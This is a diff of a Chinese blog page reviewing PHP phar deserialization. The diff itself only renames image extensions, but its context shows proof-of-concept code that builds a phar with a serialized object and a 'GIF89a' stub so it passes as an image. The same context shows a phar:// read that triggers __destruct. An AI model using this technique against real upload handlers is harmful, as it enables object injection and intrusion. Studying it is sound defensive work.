@@ -96,15 +96,15 @@
 <meta property="og:site_name" content="Even-Want">
 <meta property="og:description" content="前言  web方面好久都没关注了，好多知识都忘得差不多了，从今天开始，慢慢巩固起来。   phar这个漏洞是在2018年的BlackHat会议上公布的。能够在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。 phar文件结构 stub(标志位) 格式形如xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;，必须要以__HALT_COMP">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/2.png">
-<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/4.png">
-<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/3.png">
-<meta property="og:updated_time" content="2019-05-10T06:40:40.830Z">
+<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/1.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/2.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/4.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/3.PNG">
+<meta property="og:updated_time" content="2019-05-22T13:26:22.486Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phar 反序列化复习">
 <meta name="twitter:description" content="前言  web方面好久都没关注了，好多知识都忘得差不多了，从今天开始，慢慢巩固起来。   phar这个漏洞是在2018年的BlackHat会议上公布的。能够在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。 phar文件结构 stub(标志位) 格式形如xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;，必须要以__HALT_COMP">
-<meta name="twitter:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/10/phar-反序列化复习/1.PNG">
 
 
 
@@ -419,15 +419,15 @@
 </ul>
 <h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><p>  大多数PHP文件操作允许使用各种URL协议去访问文件路径，比如php://、data:// 。但是phar://这个协议之前却都没有人关注过。phar文件与其他文件不同之处在于，它的文件内容中包含序列化的数据。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class even_want</span><br><span class="line">&#123;</span><br><span class="line">	var $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&apos;poc.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&apos;test.txt&apos;, &apos;text&apos;);</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ? &gt;&apos;);</span><br><span class="line">class AnyClass &#123;&#125;</span><br><span class="line">$object = new even_want;</span><br><span class="line">$object-&gt;s = &apos;hack&apos;;</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
-<p>使用上面的代码生成相应的phar文件之后，使用十六进制查看器查看对应内容。<br>==注意：执行这段php代码的时候，需要将php.ini中的phar.readonly选项设置为Off，否则php会报错。==<br><img src="/2019/05/10/phar-反序列化复习/1.png" alt="1"><br>能够看到文件数据中确实有着序列化数据。</p>
+<p>使用上面的代码生成相应的phar文件之后，使用十六进制查看器查看对应内容。<br>==注意：执行这段php代码的时候，需要将php.ini中的phar.readonly选项设置为Off，否则php会报错。==<br><img src="/2019/05/10/phar-反序列化复习/1.PNG" alt="1"><br>能够看到文件数据中确实有着序列化数据。</p>
 <p>通过phar://协议来读取现有的phar文件，那么文件中存储的序列化数据就会被反序列化，而如果此时程序存在已经定义的类，并且类中存在类似于destruct、wakeup等魔术方法，就会自动调用这些函数。</p>
 <h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><p><code>test1.php</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class even_want</span><br><span class="line">&#123;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo $this-&gt;s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    $filename = &apos;phar://poc.phar/test.txt&apos;;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/05/10/phar-反序列化复习/2.png" alt="2"></p>
+<p><img src="/2019/05/10/phar-反序列化复习/2.PNG" alt="2"></p>
 <p>而且从之前的phar文件结构能发现，php识别phar文件需要stub这个标志，而对文件头或者后缀名没有要求，所以我们可以在其基础上添加文件头，并修改其后缀，来进行相应的绕过。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class even_want</span><br><span class="line">&#123;</span><br><span class="line">	var $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&apos;poc.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&apos;test.txt&apos;, &apos;text&apos;);</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ? &gt;&quot;);</span><br><span class="line">class AnyClass &#123;&#125;</span><br><span class="line">$object = new even_want;</span><br><span class="line">$object-&gt;s = &apos;hack&apos;;</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/05/10/phar-反序列化复习/4.png" alt="4"><br>可以看到最后生成的phar文件已经被识别为gif文件。</p>
-<p>具体受影响的函数：<br><img src="/2019/05/10/phar-反序列化复习/3.png" alt="3"></p>
+<p><img src="/2019/05/10/phar-反序列化复习/4.PNG" alt="4"><br>可以看到最后生成的phar文件已经被识别为gif文件。</p>
+<p>具体受影响的函数：<br><img src="/2019/05/10/phar-反序列化复习/3.PNG" alt="3"></p>
 
       
     </div>
